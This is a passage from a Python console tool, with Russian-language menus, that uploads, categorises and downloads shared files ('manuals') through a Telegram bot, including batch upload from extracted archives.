                    shutil.rmtree(temp_extract_dir, ignore_errors=True)
                    continue
                db = self.load_db()
                files_list = db.get('files', [])
                uploaded = 0
                skipped = 0
                errors = 0
                try:
                    for i, file_path in enumerate(files_to_upload, 1):
                        file_name = os.path.basename(file_path)
                        cat_key = self.get_file_category(file_path)
                        print(f"\n[{i}/{len(files_to_upload)}] Обработка: {file_name}...")
                        success, message = self.upload_single_file(file_path, cat_key, pc_name, files_list)
                        if success:
                            uploaded += 1
                            files_list = self.load_db().get('files', [])
                            print(f"[OK] {message}")
                        else:
                            if "уже существует" in message:
                                skipped += 1
                                print(f"[SKIP] {message}")
                            else:
                                errors += 1
                                print(f"[ERROR] {message}")
                        if i < len(files_to_upload):
                            time.sleep(1)
                finally:
                    print(f"\n[INFO] Удаление временной папки...")
                    shutil.rmtree(temp_extract_dir, ignore_errors=True)
                    print(f"[OK] Временная папка удалена. Исходный архив сохранен: {archive_path}")
                self.upload_db_to_cloud()
                print(f"\n{'='*40}")
                print(f"РЕЗУЛЬТАТЫ ЗАГРУЗКИ:")
                print(f"Успешно: {uploaded}")
                print(f"Пропущено: {skipped}")
                print(f"Ошибок: {errors}")
                print(f"{'='*40}")
                print(f"\n[INFO] Исходный архив остался на месте: {archive_path}")
                input("\nEnter для продолжения...")
    
    def download_menu(self):
        while True:
            clear_screen()
            print("----------------------------------------")
            print("           ЧИТАТЬ МАНУАЛЫ              ")
            print("----------------------------------------")
            db = self.load_db()
            files_list = db.get('files', [])
            print(f"Всего файлов: {len(files_list)}")
            print("-" * 30)
            cats = list(self.SECTION_NAMES.keys())
            for i, key in enumerate(cats, 1):
                print(f"{i}. {self.SECTION_NAMES[key]}")
            print("0. Назад")
            choice = input("\nВаш выбор > ")
            if choice == '0': return
            try:
                selected_cat = cats[int(choice)-1]
            except: continue
            files = [f for f in files_list if f['category'] == selected_cat]
            if not files:
                print("[INFO] Пусто.")
                time.sleep(1)
                continue
            print(f"\n--- {self.SECTION_NAMES[selected_cat]} ---")
            for i, f in enumerate(files, 1):
                size = f.get('size', '?')
                print(f"{i}. {f['name']} ({size})")
            f_choice = input("\nНомер для скачивания (0 - отмена) > ")
            if f_choice == '0': continue
            try:
                target = files[int(f_choice)-1]
                print(f"\n[....] Скачивание: {target['name']}...")
                file_info = self.bot.get_file(target['file_id'])
                downloaded = self.bot.download_file(file_info.file_path)
                script_dir = os.path.dirname(os.path.abspath(__file__))
                save_dir = os.path.join(script_dir, "SolidM_downloads")
                if not os.path.exists(save_dir): os.makedirs(save_dir)
                final_path = os.path.join(save_dir, target['name'])
                with open(final_path, 'wb') as f:
                    f.write(downloaded)
                print(f"[OK] Сохранено: {final_path}")
                if target['name'].endswith('.bat'):
                    print("[WARN] Это .bat файл. Будьте осторожны при запуске.")
                input("Enter...")
            except Exception as e:
                print(f"[ERROR] {e}")
                input("Enter...")
    
    @staticmethod
    def show_instructions():
        clear_screen()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                  ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ                ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print("\n[ОПИСАНИЕ]")
        print("SolidM - система управления файлами через Telegram бота.")
        print("Позволяет загружать и скачивать файлы, организованные по категориям.\n")
        print("[ВОЗМОЖНОСТИ]")
        print("1. Загрузка одного файла")
        print("2. Загрузка всех файлов из папки")
        print("3. Распаковка и загрузка файлов из архива")
        print("4. Просмотр и скачивание файлов по категориям\n")
        input("Нажмите Enter, чтобы вернуться... ")
    
    def menu(self):
        self.download_db_from_cloud()
        user_identity = self.get_pc_identity()
        while True:
            clear_screen()
            print(r"""
   _____       _ _     _ __  __ 
  / ____|     | (_)   | |  \/  |
 | (___   ___ | |_  __| | \  / |
  \___ \ / _ \| | |/ _` | |\/| |
  ____) | (_) | | | (_| | |  | |
 |_____/ \___/|_|_|\__,_|_|  |_| (Википедия Мануалов)
            """)
            print(f"User: {user_identity}" + "⠀(Я не ручаюсь за наличие вирусов)")
            print("========================================")
            print("1. Читать Мануалы")
            print("2. Отправить файл")
            print("3. Синхронизация")
            print("0. Назад")
            choice = input("\n> ")
            if choice == '1':
                self.download_menu()
            elif choice == '2':
                self.upload_process()
            elif choice == '3':
                self.download_db_from_cloud()
                print(f"База данных обновлена.\nКэш: {self.LOCAL_DB_PATH}")
                input("Enter...")
            elif choice == '0':
                break

def main():
    while True:
        clear_screen()
        print_logo()
        
        choice = input("> Введите номер: ").strip()
        
        if choice == "1":
            SolidX.menu()
        elif choice == "2":
            SolidY.menu()
        elif choice == "3":
            solidm = SolidM()
            solidm.menu()
        elif choice == "0":
            sys.exit()
        else:
            pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nПринудительное завершение.")
        sys.exit()